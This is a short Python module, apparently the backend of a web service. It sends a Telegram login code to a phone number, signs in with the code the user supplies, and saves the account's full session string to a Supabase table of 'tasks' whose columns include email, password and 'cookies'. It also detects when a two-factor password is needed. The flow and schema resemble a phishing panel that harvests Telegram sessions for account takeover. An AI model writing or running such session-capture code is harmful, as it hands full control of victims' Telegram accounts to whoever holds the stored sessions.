import os
from telethon import TelegramClient
from telethon.sessions import StringSession
from dotenv import load_dotenv
from db import supabase

load_dotenv()
API_ID = int(os.getenv("TG_API_ID"))
API_HASH = os.getenv("TG_API_HASH")

# Memory me active logins store karne ke liye
active_clients = {}

async def send_tg_otp(phone):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        active_clients[phone] = {
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash
        }
        return {"status": "success", "message": "OTP sent successfully"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

async def verify_tg_otp(phone, otp):
    if phone not in active_clients:
        return {"status": "error", "message": "Session expired. Try again."}
    
    data = active_clients[phone]
    client = data["client"]
    
    try:
        await client.sign_in(phone=phone, code=otp, phone_code_hash=data["phone_code_hash"])
        session_string = client.session.save()
        
        # Supabase me save kar
        supabase.table('tasks').insert({
            "platform": "telegram",
            "phone": phone,
            "email": "Telegram_Account",
            "password": "StringSession",
            "status": "success",
            "cookies": session_string
        }).execute()
        
        del active_clients[phone]
        await client.disconnect()
        return {"status": "success", "session": session_string}
    except Exception as e:
        if "Two-step verification" in str(e) or "password" in str(e).lower():
            return {"status": "needs_password", "message": "2FA Password Required"}
        return {"status": "error", "message": str(e)}
